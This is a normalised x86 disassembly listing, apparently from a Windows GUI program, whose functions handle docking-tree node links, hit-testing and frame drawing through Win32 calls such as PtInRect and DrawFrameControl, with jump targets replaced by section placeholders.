mov [ esi + 0x64 ] ebx
push esi
push sub_43da44
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43c728
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_43ddc8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43c728
mov eax [ esi + 0x64 ]
call sub_43c374
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_43defc
xor edx edx
mov eax esi
call sub_43c728
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_43c39c
adc edx 0x0
mov eax ebx
call sub_43c05c
mov eax ebx
call sub_43c3ec
push esi
push sub_43defc
xor edx edx
mov eax esi
call sub_43c728
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_43cb7c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_43c05c
mov eax [ ebx + 0x14 ]
call sub_43c3ec
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_43cbf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_43c374
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43c374
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_43c374
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43bf40
mov esi eax
mov edx 0x2
mov eax ebx
call sub_43bf40
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_43c374
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_43c44c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43c474
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43c44c
call sub_43cbf4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43c474
call sub_43cbf4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_43bfac
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_43bfac
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_43ce20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_436ea0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_436e64
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412404
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ceb4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_43ce20
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43c474
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43c6c0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43c474
call sub_43cbf4
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_43cf3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403eac
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4044f8
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_43cf84
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43d17c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_43d654
mov eax [ ebp - 0x8 ]
call sub_43c650
xor edx edx
push ebp
push sub_43d15f
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d166
mov eax [ ebp - 0x8 ]
call sub_43c654
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43be28
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_43cf3c
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_4032ec
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43c148
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_43cf3c
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_433890
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_434688
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4030f0
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_43d18c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_41242c
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41dadc
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d1e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41d044
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41d7a0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41d740
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41d740
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41d044
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41d740
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41d740
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43d26c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_43d18c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_43d1e4
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_43d1e4
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_43d18c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_43d1e4
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_43d1e4
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_43d348
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d49e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43254c
mov eax [ ebp - 0x4 ]
call sub_41d778
xor eax eax
push ebp
push sub_43d481
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41db5c
xor eax eax
push ebp
push sub_43d464
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_436ea0
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d46b
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41db5c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_436e64
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_433310
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43d4ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_438ca0
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4333b8
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_433374
mov ecx eax
xor edx edx
xor eax eax
call sub_41242c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_43a170
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412454
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_43d620
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43d620
pop ecx
mov eax ebx
call sub_4030f0
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43d620
pop ecx
sub_43d654
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_43d620
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_4030f0
xor eax eax
mov [ esi + 0x64 ] eax
sub_43d6b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c6c0
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_43d6ec
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d6ec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43d959
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov edx [ ebp - 0x8 ]
pop eax
call sub_404174
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax [ ebx + 0x14 ]
call sub_43be4c
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059ac
mov edx [ ebp - 0x10 ]
pop eax
call sub_404174
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_4030f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d960
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed0
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_43c1fc
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_43c374
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_43c3b0
mov eax [ ebx + 0x18 ]
call sub_43c1fc
mov [ edx + 0x18 ] eax
push esi
push sub_43defc
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43c728
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_43c3b0
mov eax [ esi + 0x64 ]
call sub_43c374
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_4030f0
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_43ded4
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_4030f0
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_43bef8
mov edx eax
mov eax edi
call sub_43c39c
mov eax edi
call sub_43c1fc
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_43defc
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_43c728
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_43defc
mov edx [ eax + 0x14 ]
mov eax esi
